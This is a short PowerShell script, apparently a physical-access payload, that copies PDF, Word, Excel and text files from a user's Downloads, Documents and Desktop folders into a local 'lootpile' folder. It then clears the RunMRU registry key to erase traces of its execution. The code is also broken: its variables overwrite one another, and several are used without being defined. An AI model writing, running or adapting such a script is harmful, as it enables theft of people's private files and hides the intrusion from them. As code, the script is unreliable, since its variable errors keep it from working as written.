$exfil_dir_one="$Env:UserProfile\Downloads"
$exfil_dir_two="$Env:UserProfile\Documents"
$exfil_dir_three="$Env:UserProfile\Desktop"

$exfil_ext_one="*.pdf"
$exfil_dir_two=".docx"
$exfil_dir_three=".xls"
$exfil_dir_four=".txt"
$loot_dir="$PSScriptRoot\lootpile\"
mkdir $loot_dir

robocopy $exfil_dir_one $loot_dir_one $exfil_ext /S /MT /Z
robocopy $exfil_dir_one $loot_dir_two $exfil_ext /S /MT /Z
robocopy $exfil_dir_one $loot_dir_three $exfil_ext /S /MT /Z
robocopy $exfil_dir_one $loot_dir_four $exfil_ext /S /MT /Z

robocopy $exfil_dir_two $loot_dir_one $exfil_ext /S /MT /Z
robocopy $exfil_dir_two $loot_dir_two $exfil_ext /S /MT /Z
robocopy $exfil_dir_two $loot_dir_three $exfil_ext /S /MT /Z
robocopy $exfil_dir_two $loot_dir_four $exfil_ext /S /MT /Z

robocopy $exfil_dir_three $loot_dir_one $exfil_ext /S /MT /Z
robocopy $exfil_dir_three $loot_dir_two $exfil_ext /S /MT /Z
robocopy $exfil_dir_three $loot_dir_three $exfil_ext /S /MT /Z
robocopy $exfil_dir_three $loot_dir_four $exfil_ext /S /MT /Z

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
